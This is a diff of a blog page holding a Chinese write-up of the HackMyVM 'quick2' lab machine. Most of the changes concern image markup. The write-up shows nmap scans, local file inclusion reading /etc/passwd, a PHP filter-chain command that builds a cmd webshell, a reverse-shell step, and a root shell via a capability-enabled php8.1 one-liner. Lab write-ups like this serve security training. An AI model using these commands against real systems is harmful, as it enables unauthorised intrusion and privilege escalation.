@@ -11,10 +11,10 @@
 <meta name="referrer" content="no-referrer">
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="启动靶机前 启动后 192.168.10.4 2024-02-14-20:18:39 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
-端口扫描 sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA portscan/nmap sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA portscan/vuln web 服务 主页里面在端口扫描的时候发现有一个参数 page 尝试 local file include LFI 获取到了/etc/passwd 在 home 目录下有文件夹的有这两个用户
+<meta name="description" content="启动靶机前 HMM_quick2_image_1|700 启动后 HMM_quick2_image_2|650 192.168.10.4 HMM_quick2_image_3|600 2024-02-14-20:18:39 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
+端口扫描 HMM_quick2_image_4|700 sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA portscan/nmap HMM_quick2_image_5|750 sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA portscan/vuln HMM_quick2_image_6|700 web 服务 主页里面在端口扫描的时候发现有一个参数 page 尝试 local file include LFI 获取到了/etc/passwd 在 home 目录下有文件夹的有这两个用户
 andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash 获得了 user. txt
-进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster 进入 file. php 页面
+HMM_quick2_image_7|500 HMM_quick2_image_8|483 进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster HMM_quick2_image_9|750 进入 file. php 页面
 "/>
 <meta name="keywords" content=""/>
 
@@ -35,10 +35,10 @@ andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash nick:x:1001:1001: Nick G
 <meta property="og:url" content="https://l1uyun.one/posts/hmv_quick2/">
   <meta property="og:site_name" content="l1uyun">
   <meta property="og:title" content="quick2">
-  <meta property="og:description" content="启动靶机前 启动后 192.168.10.4 2024-02-14-20:18:39 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
-端口扫描 sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA portscan/nmap sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA portscan/vuln web 服务 主页里面在端口扫描的时候发现有一个参数 page 尝试 local file include LFI 获取到了/etc/passwd 在 home 目录下有文件夹的有这两个用户
+  <meta property="og:description" content="启动靶机前 HMM_quick2_image_1|700 启动后 HMM_quick2_image_2|650 192.168.10.4 HMM_quick2_image_3|600 2024-02-14-20:18:39 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
+端口扫描 HMM_quick2_image_4|700 sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA portscan/nmap HMM_quick2_image_5|750 sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA portscan/vuln HMM_quick2_image_6|700 web 服务 主页里面在端口扫描的时候发现有一个参数 page 尝试 local file include LFI 获取到了/etc/passwd 在 home 目录下有文件夹的有这两个用户
 andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash 获得了 user. txt
-进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster 进入 file. php 页面">
+HMM_quick2_image_7|500 HMM_quick2_image_8|483 进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster HMM_quick2_image_9|750 进入 file. php 页面">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -243,19 +243,49 @@ function checkNightMode() {
   </ul>
 </nav>
       <p>启动靶机前
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_1.png" alt="HMM_quick2_image_1|700"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_1.png" alt="HMM_quick2_image_1|700" /><figcaption>HMM_quick2_image_1|700</figcaption></figure>
+
+
+
 启动后
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_2.png" alt="HMM_quick2_image_2|650"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_2.png" alt="HMM_quick2_image_2|650" /><figcaption>HMM_quick2_image_2|650</figcaption></figure>
+
+
+
 192.168.10.4
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_3.png" alt="HMM_quick2_image_3|600"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_3.png" alt="HMM_quick2_image_3|600" /><figcaption>HMM_quick2_image_3|600</figcaption></figure>
+
+
+
 2024-02-14-20:18:39
 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了</p>
 <h2 id="端口扫描">端口扫描</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_4.png" alt="HMM_quick2_image_4|700"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_4.png" alt="HMM_quick2_image_4|700" /><figcaption>HMM_quick2_image_4|700</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_5.png" alt="HMM_quick2_image_5|750"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_5.png" alt="HMM_quick2_image_5|750" /><figcaption>HMM_quick2_image_5|750</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script<span style="color:#f92672">=</span>vuln -oA  portscan/vuln
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_6.png" alt="HMM_quick2_image_6|700"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_6.png" alt="HMM_quick2_image_6|700" /><figcaption>HMM_quick2_image_6|700</figcaption></figure>
+
+
+</p>
 <h2 id="web-服务">web 服务</h2>
 <p>主页里面在端口扫描的时候发现有一个参数 page
 尝试 local file include LFI
@@ -264,35 +294,100 @@ function checkNightMode() {
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
 </span></span><span style="display:flex;"><span>nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
 </span></span></code></pre></div><p>获得了 user. txt</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_7.png" alt="HMM_quick2_image_7|500"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_8.png" alt="HMM_quick2_image_8|483"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_7.png" alt="HMM_quick2_image_7|500" /><figcaption>HMM_quick2_image_7|500</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_8.png" alt="HMM_quick2_image_8|483" /><figcaption>HMM_quick2_image_8|483</figcaption></figure>
+
+
+</p>
 <p>进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_9.png" alt="HMM_quick2_image_9|750"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_9.png" alt="HMM_quick2_image_9|750" /><figcaption>HMM_quick2_image_9|750</figcaption></figure>
+
+
+
 进入 file. php 页面</p>
 <h2 id="利用-php-伪协议获得一个-webshell">利用 php 伪协议获得一个 webshell</h2>
 <p>写了是 LFI 漏洞
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_10.png" alt="HMM_quick2_image_10|479"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_10.png" alt="HMM_quick2_image_10|479" /><figcaption>HMM_quick2_image_10|479</figcaption></figure>
+
+
+
 2024-02-14-20:40:27
 这个工具是看大佬的 wp 视频知道了, 反正以后遇到使用 php 伪协议的, 就可以用这个工具了</p>
 <p>使用工具生成一个复杂的伪协议利用代码，获得一个 webshell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python php_filter_chain_generator.py --chain <span style="color:#e6db74">&#34;&lt;?php echo system(</span>$_GET<span style="color:#e6db74">[&#39;cmd&#39;]) ?&gt;&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_11.png" alt="HMM_quick2_image_11|700"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_12.png" alt="HMM_quick2_image_12|900"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_11.png" alt="HMM_quick2_image_11|700" /><figcaption>HMM_quick2_image_11|700</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_12.png" alt="HMM_quick2_image_12|900" /><figcaption>HMM_quick2_image_12|900</figcaption></figure>
+
+
+</p>
 <p>测试之后发现存在 nc，但是不能用
 只能 php 反向 shell 了, 上传一下, 然后执行</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_13.png" alt="HMM_quick2_image_13|900"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_14.png" alt="HMM_quick2_image_14|800"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_13.png" alt="HMM_quick2_image_13|900" /><figcaption>HMM_quick2_image_13|900</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_14.png" alt="HMM_quick2_image_14|800" /><figcaption>HMM_quick2_image_14|800</figcaption></figure>
+
+
+</p>
 <h2 id="php-反向-shell-获得立足点">php 反向 shell 获得立足点</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_15.png" alt="HMM_quick2_image_15"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_16.png" alt="HMM_quick2_image_16"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_15.png" alt="HMM_quick2_image_15" /><figcaption>HMM_quick2_image_15</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_16.png" alt="HMM_quick2_image_16" /><figcaption>HMM_quick2_image_16</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>a<span style="color:#f92672">=</span>php%20/tmp/shell.txt
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_17.png" alt="HMM_quick2_image_17"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_17.png" alt="HMM_quick2_image_17" /><figcaption>HMM_quick2_image_17</figcaption></figure>
+
+
+</p>
 <h2 id="利用-capabilities-文件提权">利用 capabilities 文件提权</h2>
 <p>第一步先上脚本, linpeas. sh, 然后发现了这个特殊权限的文件 php</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_18.png" alt="HMM_quick2_image_18"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_18.png" alt="HMM_quick2_image_18" /><figcaption>HMM_quick2_image_18</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1 -r <span style="color:#e6db74">&#34;posix_setuid(0);system(&#39;/bin/sh&#39;);&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_19.png" alt="HMM_quick2_image_19"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_19.png" alt="HMM_quick2_image_19" /><figcaption>HMM_quick2_image_19</figcaption></figure>
+
+
+</p>
 <h2 id="尝试其他思路">尝试其他思路</h2>
 <p>尝试爆破一下密码, 但是没成功
 根据后面获得的 shadow 文件也没有破解出对应的密码</p>
@@ -450,7 +545,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
